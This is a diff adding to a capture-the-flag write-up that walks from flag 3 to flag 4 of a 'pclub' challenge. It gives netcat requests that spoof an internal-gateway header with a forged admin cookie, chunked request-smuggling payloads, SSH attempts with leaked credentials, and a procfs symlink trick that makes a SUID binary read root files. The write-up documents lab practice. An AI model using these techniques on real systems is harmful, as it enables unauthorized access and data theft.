@@ -591,23 +591,487 @@ This suggested:
 
 ---
 
-# Step 55 — Current State of the Investigation
+## After finding of three flags we have the following informations: - 
 
-Completed:
-- OSINT investigation,
-- GitHub analysis,
-- hidden page discovery,
-- shell exploitation,
-- ProcFS privilege escalation,
-- EuroFreight exploitation,
-- gateway bypassing,
-- request smuggling,
-- internal endpoint access,
-- multiple flag recovery.
-
-Remaining unresolved areas:
-- SSH infrastructure,
-- mysterious service on port 8008,
-- off-system signaling mechanisms.
+After flag 3, two key unexplored leads remained:
+1. **Port 8008** on `168.144.73.17` — accepted TCP connections but returned no data
+2. **SSH on port 22** — required a public key, not a password
+3. **`/internal/admin-session`** endpoint — generated admin cookies but nothing beyond that
+4. Credentials found alongside flag 1: `analyst:Fr8_4nalyst!`
 
 ---
+
+## Step 1: Hitting `/internal/admin-session` with the New Cookie
+
+**The Command for each of the step is also being mentioned here:**
+```bash
+printf 'GET http://127.0.0.1/internal/admin-session HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJyb2xlIjoiYWRtaW4ifQ.ag8GYg.JBF33R3waq2kcA-aUBJLZGU2KlY\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+**Result:**
+```
+HTTP/1.1 200 OK
+Set-Cookie: session=eyJyb2xlIjoiYWRtaW4ifQ.ahF2eg.dRHT4UZc55c6oTwumOwX0UbCrsI; Path=/
+{"status":"Admin session generated"}
+```
+
+**Observation:** A fresh admin session cookie was generated. Then, I saved it for subsequent requests.
+
+---
+
+## Step 2: Probing Port 8008
+
+Tried multiple approaches to interact with the mysterious port 8008.
+
+### Attempt 1 — Raw HTTP GET
+```bash
+printf 'GET / HTTP/1.0\r\n\r\n' | nc 168.144.73.17 8008
+```
+**Result:** No output. Silent.
+
+### Attempt 2 — Plain netcat connection
+```bash
+nc -v 168.144.73.17 8008
+```
+**Result:** Connection succeeded but hung indefinitely with no response.
+
+### Attempt 3 — With timeout
+```bash
+nc -w 5 168.144.73.17 8008 < /dev/null
+```
+**Result:** Timed out silently.
+
+**Conclusion:** Port 8008 was accepting connections but not responding to standard HTTP. Deferred for later investigation.
+
+---
+
+## Step 3: SSH Attempt with Found Credentials
+
+```bash
+ssh analyst@168.144.73.17
+# Password: Fr8_4nalyst!
+```
+
+**Result:**
+```
+analyst@168.144.73.17: Permission denied (publickey).
+```
+
+**Observation:** SSH was configured to require a public key, not password authentication. Without a private key, this path was blocked.
+
+---
+
+## Step 4: POST Smuggling to `/internal/admin-session`
+
+Tried HTTP request smuggling using chunked transfer encoding:
+
+```bash
+printf 'POST http://127.0.0.1/internal/admin-session HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\nCookie: session=...\r\n\r\n0\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+**Result:**
+```
+HTTP/1.1 405 METHOD NOT ALLOWED
+Allow: GET, OPTIONS, HEAD
+```
+
+**Conclusion:** `/internal/admin-session` only accepts GET requests. Smuggling not applicable here.
+
+---
+
+## Step 5: Re-hitting `/internal/queue` with New Admin Cookie
+
+```bash
+printf 'GET http://127.0.0.1/internal/queue HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJyb2xlIjoiYWRtaW4ifQ.ahF2eg.dRHT4UZc55c6oTwumOwX0UbCrsI\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+**Result:**
+```json
+{"flagged_shipments":["PCLUB{5muggl1ng_ch41n_unl0ck3d}"],"status":"success"}
+```
+
+**Conclusion:** Same flag 2 returned. No new data from the refreshed admin session.
+
+---
+
+## Step 6: Checking API Docs with Admin Cookie
+
+```bash
+printf 'GET http://127.0.0.1/api-docs HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+**Result:**
+```json
+{
+  "endpoints": [
+    {"method":"POST","path":"/upload"},
+    {"method":"GET","path":"/internal/queue"},
+    {"method":"GET","path":"/internal/admin-session"}
+  ]
+}
+```
+
+**Observation:** Only 3 endpoints documented. No new hidden endpoints revealed by the admin cookie.
+
+---
+
+## Step 7: Exploring the `/upload` Endpoint
+
+### Attempt 1 — GET request
+```bash
+printf 'GET http://127.0.0.1/upload HTTP/1.1\r\n...' | nc 168.144.73.17 8003
+```
+**Result:** `405 METHOD NOT ALLOWED` — POST only.
+
+### Attempt 2 — POST with JSON manifest
+```bash
+printf 'POST http://127.0.0.1/upload HTTP/1.1\r\n...Content-Length: 27\r\n\r\n{"manifest":"ADMIN_TEST_001"}' | nc 168.144.73.17 8003
+```
+**Result:** `{"tracking_id":"TRK-9901X-A"}` — Static dummy response regardless of input.
+
+### Attempt 3 — Chunked transfer smuggling
+```bash
+printf 'POST http://127.0.0.1/upload HTTP/1.1\r\n...Transfer-Encoding: chunked\r\n\r\n1a\r\n{"manifest":"SMUGGLE_TEST"}\r\n0\r\nX-Smuggled: true\r\n\r\nGET /internal/flag HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n' | nc 168.144.73.17 8003
+```
+**Result:**
+```
+{"tracking_id":"TRK-9901X-A"}
+Bad Request — Invalid header
+403 Forbidden — Access Denied: Direct access to internal endpoints is forbidden by the Gateway
+```
+
+**Observation:** `/internal/flag` returned a 403, confirming the endpoint exists but is protected. The smuggling technique was only applicable for flag 2.
+
+---
+
+## Step 8: Trying `/internal/flag` Directly
+
+```bash
+printf 'GET http://127.0.0.1/internal/flag HTTP/1.1\r\n...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+**Result:** `404 NOT FOUND` — Endpoint does not exist under that name.
+
+---
+
+## Step 9: Enumerating Other Internal Endpoints
+
+Tried various guessed endpoint names — all returned 404:
+
+```bash
+# /internal/ssh-key
+# /internal/flag
+# /shipments (without ID)
+# /internal/debug
+# /internal/logs
+# /internal/status
+# /internal/config
+```
+
+All returned `404 Not Found`.
+
+---
+
+## Step 10: Full Dashboard Enumeration
+
+Fetched the raw dashboard HTML with the admin cookie:
+
+```bash
+printf 'GET http://127.0.0.1/dashboard HTTP/1.1\r\n...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+**Result:** Three shipments found: The screenshot of the table is being mentioned below: - 
+![image alt](https://github.com/amritanshukumar2006-collab/Programming-Club-Secretary-Task/blob/54dd5010ca74367670b8666643d3921def2cc019/Screenshot%20From%202026-05-26%2003-34-45.png)
+
+| ID | Status |
+|----|--------|
+| LND-OCT12 | In Transit |
+| BERLIN-NOV07 | HELD — ADMIN CLEARANCE REQUIRED |
+| AMS-DEC01 | Delivered |
+
+Tried hitting each individually:
+```bash
+# /shipments/LND-OCT12  → 404
+# /shipments/AMS-DEC01  → 404
+```
+
+Only `BERLIN-NOV07` had previously returned flag 3. Others were dead ends.
+
+---
+
+## Step 11: DNS Reconnaissance
+
+Checked TXT records across all known subdomains:
+
+```bash
+dig TXT pclub.in           # No TXT records
+dig TXT recjail.pclub.in   # No TXT records
+dig TXT eurofreight.pclub.in  # NXDOMAIN
+dig TXT 0xc1ph3rf0x.pclub.in  # NXDOMAIN
+dig -x 168.144.73.17       # DigitalOcean hosted, no PTR record
+```
+
+**Conclusion:** No new DNS signals found.
+
+---
+
+## Step 12: GitHub Repository Deep Dive
+
+Explored the full `0xC1ph3rF0x/infosec-notes` repository commit history:
+
+```bash
+curl -s https://api.github.com/repos/0xC1ph3rF0x/infosec-notes/commits | jq '.[].sha'
+```
+
+Four commits found. Inspected each one:
+
+| Commit | Files |
+|--------|-------|
+| `67082fd` | `workshops/network-basics.md` |
+| `a7f51e4` | `workshops/web-security-101.md` |
+| `f907db0` | `resources/reading-list.md`, `resources/tools.md` |
+| `4c2597e` | `README.md` (initial commit) |
+
+All files contained generic infosec content — nothing hidden in patches or deleted files.
+
+**Conclusion:** GitHub repo was a complete dead end for the 4th flag.
+
+---
+
+## Step 13: Port 8008 — Credentials as Payload
+
+Tried sending the found credentials directly to port 8008:
+
+```bash
+printf 'analyst:Fr8_4nalyst!\n' | nc -w 3 168.144.73.17 8008
+```
+
+**Result:** Session timed out, no response.
+
+---
+
+## Step 14: Back to the nsjail Shell — SUID Enumeration
+
+Returned to the web terminal at `recjail.pclub.in` and ran:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+**Result:** Only `/usr/local/bin/secure_reader` was the custom CTF binary. Same as before.
+
+---
+
+## Step 15: Using `secure_reader` via ProcFS — Rebuilding the Symlink
+
+The nsjail resets the home directory each session. Recreated the procfs symlink:
+
+```bash
+mkdir /home/ctf_user/proc && ln -s /proc /home/ctf_user/proc/p
+```
+
+Then read various system files as root:
+
+```bash
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/environment
+# Result: Standard PATH only
+
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/hosts
+# Result: 127.0.0.1 localhost, 172.21.0.2 af8672217670
+```
+
+**Key Discovery:** The `/etc/hosts` file revealed an internal Docker network IP: `172.21.0.2` mapped to container hostname `af8672217670`.
+
+---
+
+## Step 16: Internal Network Exploration
+
+Tried to explore the Docker network at `172.21.0.x`:
+
+```bash
+ping -c 1 172.21.0.1   # bash: ping: command not found
+cat /proc/net/fib_trie  # Only loopback 127.0.0.1 visible
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/proc/net/tcp
+# Empty — no active connections
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/proc/net/arp
+# Empty ARP table
+```
+
+**Conclusion:** The nsjail container was isolated from the Docker network. The `172.21.0.2` IP was visible in hosts but unreachable from inside the sandbox.
+
+---
+
+## Step 17: Reading the `secure_reader` Binary Itself
+
+Attempted to read the binary to find hardcoded strings:
+
+```bash
+strings /usr/local/bin/secure_reader   # command not found
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/usr/local/bin/secure_reader
+# Access Granted but output was raw binary — unreadable without xxd/strings
+```
+
+---
+
+## Step 18: Environment Variable Check
+
+```bash
+cat /proc/self/environ | tr '\0' '\n'
+```
+
+**Result:**
+```
+PWD=/home/ctf_user
+HOME=/home/ctf_user
+USER=ctf_user
+SHLVL=0
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/cat
+```
+
+No hidden flag or pointer in the environment.
+
+---
+
+## Step 19: Re-reading `flag.txt` — The Breakthrough
+
+Re-ran the original flag 1 command that had worked before:
+
+```bash
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt
+```
+
+**Result:**
+```
+[+] Access Granted. Reading file:
+pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l}
+168.144.73.17:8003, idp: analyst:Fr8_4nalyst!
+[100264, 9125, 198, 2675, 527, 264, 11190, 18328, 100265, 198, 100264, 882, 198, 79, 20453, 90, 22, 32680, 15, 74, 62, 18, 1107, 292, 18, 81, 534, 51, 2757, 3686, 30, 7566, 30, 468, 14773, 2413, 79, 13, 720, 35170, 11, 6555, 990, 12222, 1618, 13, 2567, 433, 709, 627, 2485, 1129, 47216, 1103, 916, 14, 18, 71, 43559, 17, 67, 23, 100265, 198, 100264, 78191, 198]
+```
+
+**Key Discovery:** A new array of integers had appeared at the bottom that wasn't visible in earlier reads (or had been missed). This was the critical clue for the 4th flag.
+
+---
+
+## Step 20: Identifying the Token Format
+
+Analyzed the integer array:
+
+```
+[100264, 9125, 198, 2675, 527, 264, 11190, 18328, 100265, 198, 100264, 882, 198, ...]
+```
+
+Recognized the structure:
+- `100264` = `<|im_start|>` (ChatML special token)
+- `100265` = `<|im_end|>` (ChatML special token)
+- `198` = newline
+- `9125` = `system`
+- `882` = `user`
+- `78191` = `assistant`
+
+These are **cl100k_base token IDs** — the tokenizer used by GPT-4 and related models. The format is **ChatML**, confirming this was an LLM-formatted message with the flag encoded as token IDs.
+
+### Failed Decode Attempts
+
+**Attempt 1 — Unicode codepoints:**
+```python
+result = ''.join(chr(t) for t in tokens if t < 0x110000)
+# Result: Garbled unicode — wrong approach
+```
+
+**Attempt 2 — Manual token mapping:**
+Attempted to hand-map known tokens using approximate vocabulary:
+```
+pclub{7ikt0k_3_nic3r}  (partially guessed but imprecise)
+```
+
+**Attempt 3 — Online API:**
+```python
+import urllib.request
+req = urllib.request.Request('https://api.openai.com/v1/embeddings')
+# Hung — wrong endpoint for decoding tokens
+```
+
+**Attempt 4 — Port 8008 as LLM endpoint:**
+```bash
+printf '{"tokens":[79,20453,90,...]}\n' | nc -w 5 168.144.73.17 8008
+# No response — port 8008 does not accept token IDs
+```
+
+---
+
+## Step 21: Installing `tiktoken` and Decoding the Flag
+
+Installed the official OpenAI tokenizer library on the local machine:
+
+```bash
+pip3 install tiktoken --break-system-packages
+```
+
+Then decoded the token array:
+
+```python
+import tiktoken
+enc = tiktoken.get_encoding('cl100k_base')
+tokens = [79, 20453, 90, 22, 32680, 15, 74, 62, 18, 1107, 292, 18, 81, 534, 51,
+          2757, 3686, 30, 7566, 30, 468, 14773, 2413, 79, 13, 720, 35170, 11,
+          6555, 990, 12222, 1618, 13, 2567, 433, 709, 627, 2485, 1129, 47216,
+          1103, 916, 14, 18, 71, 43559, 17, 67, 23]
+print(enc.decode(tokens))
+```
+
+**Output:**
+```
+pclub{7ikt0k_3_nic3r}
+Tired yet? Yes? Womp womp.
+JK, nice work till here. keep it up.
+https://tinyurl.com/3hxbe2d8
+```
+
+---
+
+## Flag 4 Captured
+
+```
+pclub{7ikt0k_3_nic3r}
+```
+
+### What the Flag Means
+
+The flag `7ikt0k_3_nic3r` is a leet-speak version of **"tiktoken is nicer"** — a playful nod to the fact that the flag was encoded using OpenAI's `tiktoken` (cl100k_base) tokenizer, and the solve required installing and using it to decode the ChatML-formatted token ID array.
+
+---
+
+## Summary of the Attack Chain
+
+```
+flag.txt (root) via secure_reader + procfs pivot
+    └── Hidden token array appended to file
+        └── Recognized as cl100k_base ChatML token IDs
+            └── Installed tiktoken locally
+                └── Decoded user-turn tokens
+                    └── pclub{7ikt0k_3_nic3r} + next stage URL
+```
+
+---
+
+## Key Techniques Used
+
+| Technique | Application |
+|-----------|-------------|
+| ProcFS pivot via symlink | Bypassing `secure_reader` path restrictions |
+| SUID binary abuse | Reading root-owned files as `ctf_user` |
+| Token ID recognition | Identifying cl100k_base ChatML format |
+| tiktoken decoding | Extracting the flag from integer token array |
+
+---
+
+## Next Stage
+
+The decoded message pointed to: `https://tinyurl.com/3hxbe2d8`
+
+This URL leads to a GitHub Gist containing a large block of base64-encoded data — the starting point for the fifth flag investigation.
+
+---
+
+*Write-up covers the complete investigation from flag 3 completion through flag 4 capture, including all failed enumeration attempts across GitHub, DNS, internal API endpoints, network scanning, and port 8008 probing.*
